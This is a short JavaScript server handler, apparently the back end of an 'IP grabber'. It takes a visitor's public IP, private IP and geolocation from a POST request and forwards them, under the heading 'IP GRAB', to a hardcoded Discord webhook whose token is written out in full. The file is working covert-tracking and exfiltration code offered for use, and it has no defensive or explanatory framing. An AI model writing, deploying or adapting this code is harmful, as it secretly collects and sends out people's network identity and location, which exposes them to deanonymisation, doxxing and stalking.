export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({error: "Method not allowed"});
  }

  try {
    const body = req.body || {};
    const pub = body.pub || "unknown";
    const priv = body.priv || "unknown";
    const geo = body.geo || "unknown";

    const payload = {
      content: `IP GRAB\npublic: ${pub}\nprivate: ${priv}\ngeolocation: ${geo}`
    };

    const webhook = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ";

    await fetch(webhook, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(payload)
    });

    return res.status(200).json({ok: true});
  } catch (e) {
    return res.status(500).json({ok: false});
  }
}
